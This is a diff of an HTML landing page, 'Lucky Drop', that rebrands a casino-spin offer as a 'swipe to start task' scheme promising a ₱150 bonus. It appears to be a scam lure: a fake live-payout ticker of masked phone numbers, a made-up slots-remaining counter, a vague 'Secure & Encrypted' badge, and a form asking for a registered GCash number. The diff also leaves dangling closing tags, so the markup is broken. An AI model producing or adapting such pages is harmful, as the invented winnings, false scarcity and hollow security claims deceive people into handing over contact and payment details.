@@ -3,15 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Lucky Drop | VIP Casino Edit</title>
+    <title>Lucky Drop | Swipe to Claim</title>
     
+    <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
+    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@300;400;500;600;700;800&family=Orbitron:wght@400;500;600;700;800;900&family=Playfair+Display:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
+    <!-- External CSS -->
     <link rel="stylesheet" href="styles/instyle.css">
 </head>
 <body>
@@ -19,15 +23,17 @@
     <div class="bg-gradient"></div>
     <div class="bg-glow"></div>
 
+    <!-- Live Winners Ticker -->
     <div class="live-ticker">
         <div class="ticker-dot"></div>
         <div class="ticker-content">
-            <span class="ticker-text" id="winnerEntry">0917***4256 Jackpot +₱150</span>
+            <span class="ticker-text" id="winnerEntry">0917***4256 completed task +₱150</span>
         </div>
-        <div class="ticker-badge">LIVE PAYOUT</div>
+        <div class="ticker-badge">LIVE</div>
     </div>
 
-    <div class="main-card">
+    <!-- Main Card -->
+    <div class="main-card" id="mainCard">
         <div class="logo-area">
             <div class="logo-icon">
                 <i class="fas fa-crown"></i>
@@ -35,6 +41,7 @@
             <h1 class="logo-text">LUCKY DROP</h1>
         </div>
 
+        <!-- Value Props -->
         <div class="value-props">
             <div class="prop-row">
                 <div class="prop-icon"><i class="fas fa-check-circle"></i></div>
@@ -59,9 +66,10 @@
             </div>
         </div>
 
+        <!-- Scarcity Tracker -->
         <div class="scarcity-box">
             <div class="scarcity-header">
-                <span class="scarcity-label">VIP Slots Remaining</span>
+                <span class="scarcity-label">Limited Slots</span>
                 <div><span class="scarcity-numbers" id="remNum">88</span><span class="scarcity-total">/100</span></div>
             </div>
             <div class="progress-track">
@@ -69,37 +77,34 @@
             </div>
         </div>
 
+        <!-- Swipe to Verify Section -->
         <div class="swipe-container">
             <div class="swipe-track" id="swipeTrack">
                 <div class="swipe-fire-trail" id="swipeFireTrail"></div>
                 <div class="swipe-icon" id="swipeIcon">
                     <img src="images/scatter_icon.jpg" class="scatter-icon" alt="swipe">
                 </div>
-                <div class="swipe-text">SWIPE TO SPIN</div>
+                <div class="swipe-text">SWIPE TO START TASK</div>
             </div>
         </div>
 
         <div class="card-footer">
             <i class="fas fa-shield-alt"></i>
-            <span>128-Bit Secure & Encrypted</span>
+            <span>Secure & Encrypted</span>
         </div>
     </div>
 
-    <div class="modal-overlay" id="modalOverlay">
-        <div class="modal-container">
-            <div class="modal-card">
-                <button class="modal-close" onclick="closeModal()">✕</button>
-                
-                <div class="modal-icon">
+    <!-- Modal - Premium Version -->
+    <div class="modal-icon">
                     <i class="fas fa-gem"></i>
                 </div>
-                <h2 class="modal-title">VERIFY VIP ACCESS</h2>
-                <p class="modal-subtitle">This will be your <span class="gold-text">Casino ID</span><br>Don't use unverified numbers to avoid payout difficulties</p>
+                <h2 class="modal-title">VERIFY ACCESS</h2>
+                <p class="modal-subtitle">This will be your <span class="gold-text">Tasker ID</span><br>Don't use unverified numbers to avoid payout difficulties</p>
                 
                 <div class="bonus-box-premium">
                     <div class="bonus-glow"></div>
                     <div class="bonus-amount-premium">₱150</div>
-                    <div class="bonus-label-premium">GRAND BONUS</div>
+                    <div class="bonus-label-premium">INITIAL BONUS</div>
                     <div class="bonus-shine"></div>
                 </div>
                 
@@ -115,13 +120,13 @@
                 </div>
                 
                 <button class="login-btn" id="claimBtn" onclick="processStep1()">
-                    <span class="login-text">ENTER LOBBY</span>
+                    <span class="login-text">LOGIN</span>
                     <span class="login-dots"></span>
                 </button>
                 
                 <div class="warning-text-premium">
                     <i class="fas fa-shield-alt"></i>
-                    <span>Verified numbers only for GCash payouts</span>
+                    <span>For instant payout use registered number.</span>
                 </div>
             </div>
         </div>
